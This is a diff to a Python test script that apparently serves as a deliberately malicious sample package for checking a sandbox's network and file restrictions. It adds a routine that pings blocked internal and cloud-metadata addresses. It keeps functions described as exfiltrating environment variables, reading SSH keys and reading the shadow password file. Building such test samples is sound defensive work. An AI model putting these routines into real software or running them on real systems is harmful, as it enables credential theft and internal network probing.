@@ -1,6 +1,7 @@
 import http.client
 import json
 import os
+import re
 
 # Sends an HTTPS post request and prints out the response.
 # Exfiltrates environment variables.
@@ -13,6 +14,28 @@ def send_https_post_request(called_from: str, print_logs: bool) -> None:
   response = conn.getresponse()
   if print_logs:
     print(response.read().decode())
+
+# Attempts to ping a subset of addresses that packages should not be able to
+# ping. Checks if those addresses will send a packet back.
+def connect_to_blocked_addresses(called_from: str, print_logs: bool) -> None:
+  # blocked_addresses is based off of ip addresses that we block access to in
+  # tools/network/iptables.rules
+  blocked_addresses = ["172.16.16.1", "169.254.169.254", "10.0.0.1",
+                       "172.16.0.1", "192.168.0.1"]
+  successful_pings = []
+  for ip in blocked_addresses:
+    response = os.popen("ping -w 2 " + ip).read()
+    packets_received = re.search(", (\d+) received,", response).group(1)
+    if packets_received != "0":
+      successful_pings.append(ip)
+  if print_logs:
+    print(f"Called from: {called_from}")
+  if len(successful_pings) == 0:
+    print("No blocked addresses pinged successfully.")
+  else:
+    print(
+        "Successfully pinged the following addresses that should be blocked: ",
+        successful_pings)
 
 
 # Access ssh keys and attempts to read and write to them.
@@ -59,12 +82,13 @@ def access_passwords(called_from: str, print_logs: bool) -> None:
   # Requires root to read.
   read_file_and_log(shadow_password_file, called_from, print_logs)
 
-# Collection of functionalities to run that can be customized.
-https_functions = [send_https_post_request]
+# Collection of functionalities to run that can be customized. Pick relevant ones and then rebuild the package.
+# Notes: connect_to_blocked_addresses is slow because it will wait for ping responses.
+network_functions = [send_https_post_request, connect_to_blocked_addresses]
 access_credentials_functions = [access_ssh_keys, access_passwords]
 
 def main():
-  [f("main function", True) for f in https_functions + access_credentials_functions]
+  [f("main function", True) for f in network_functions + access_credentials_functions]
 
 if __name__ == "__main__":
   main()
